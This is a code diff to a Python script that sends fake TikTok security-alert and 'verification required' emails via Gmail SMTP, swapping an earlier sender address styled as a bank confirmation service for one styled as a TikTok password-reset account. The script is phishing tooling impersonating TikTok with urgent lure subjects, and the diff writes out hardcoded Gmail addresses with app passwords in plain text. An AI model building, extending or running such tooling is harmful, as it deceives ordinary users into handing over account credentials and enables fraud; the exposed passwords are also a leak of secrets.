@@ -291,7 +291,7 @@ def send_tiktok_security_alert(recipient_email, alert_type="new_device", tiktok_
 
     # Create message
     msg = MIMEMultipart("alternative")
-    msg["From"] = "Standardbankingconfirmation@gmail.com"  # Fixed: Use actual sender email
+    msg["From"] = "tiktokresetpass.req@gmail.com"  # Fixed: Use actual sender email
     msg["To"] = recipient_email
     msg["Subject"] = "TikTok: Security Alert - New Device Login Detected"
     
@@ -610,7 +610,7 @@ def send_tiktok_security_alert(recipient_email, alert_type="new_device", tiktok_
     try:
         server = smtplib.SMTP(smtp_server, port)
         server.starttls()
-        server.login("Standardbankingconfirmation@gmail.com", "udyu gyfv rfjj fvgk")  # Fixed: Use global Gmail credentials
+        server.login("tiktokresetpass.req@gmail.com", "gnon sheo ehxs clgt")  # Fixed: Use global Gmail credentials
         server.sendmail(msg["From"], recipient_email, msg.as_string())
         server.quit()
         print(f"✅ TikTok security alert sent successfully to {recipient_email}!")
@@ -624,7 +624,7 @@ def send_tiktok_verification_required(recipient_email, tiktok_username="user"):
     Send a TikTok verification required email
     """
     msg = MIMEMultipart("alternative")
-    msg["From"] = "Standardbankingconfirmation@gmail.com"  # Fixed: Use actual sender email
+    msg["From"] = "tiktokresetpass.req@gmail.com"  # Fixed: Use actual sender email
     msg["To"] = recipient_email
     msg["Subject"] = "TikTok: Account Verification Required - Immediate Action Needed"
     
@@ -821,7 +821,7 @@ def send_tiktok_verification_required(recipient_email, tiktok_username="user"):
     try:
         server = smtplib.SMTP(smtp_server, port)
         server.starttls()
-        server.login("Standardbankingconfirmation@gmail.com", "udyu gyfv rfjj fvgk")  # Fixed: Use global Gmail credentials
+        server.login("tiktokresetpass.req@gmail.com", "gnon sheo ehxs clgt")  # Fixed: Use global Gmail credentials
         server.sendmail(msg["From"], recipient_email, msg.as_string())
         server.quit()
         print(f"✅ TikTok verification email sent successfully to {recipient_email}!")
